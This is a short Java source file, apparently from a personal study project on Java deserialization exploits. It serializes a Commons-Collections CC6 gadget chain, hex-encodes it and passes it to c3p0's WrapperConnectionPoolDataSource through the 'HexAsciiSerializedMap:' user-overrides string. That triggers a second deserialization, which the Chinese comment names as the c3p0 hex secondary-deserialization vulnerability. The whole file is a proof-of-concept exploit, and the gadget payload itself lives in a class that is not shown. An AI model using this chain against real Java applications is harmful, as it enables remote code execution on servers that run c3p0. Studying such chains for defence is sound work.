package com.yyjccc.c3p0;

import com.mchange.lang.ByteUtils;
import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.yyjccc.CommonsExp.Cc3;
import com.yyjccc.CommonsExp.Cc6;


public class test {
	public static void main(String[] args)  {
		try {
			//C3p0 Hex二次反序列化漏洞
			String hex = ByteUtils.toHexAscii(Util.getBytesFromObj(Cc6.cc6()));
			WrapperConnectionPoolDataSource wrapperConnectionPoolDataSource = new WrapperConnectionPoolDataSource();
			wrapperConnectionPoolDataSource.setUserOverridesAsString("HexAsciiSerializedMap:"+hex+";");
			System.out.println(hex);
		} catch (Exception e) {
			throw new RuntimeException(e);
		}
	}
}
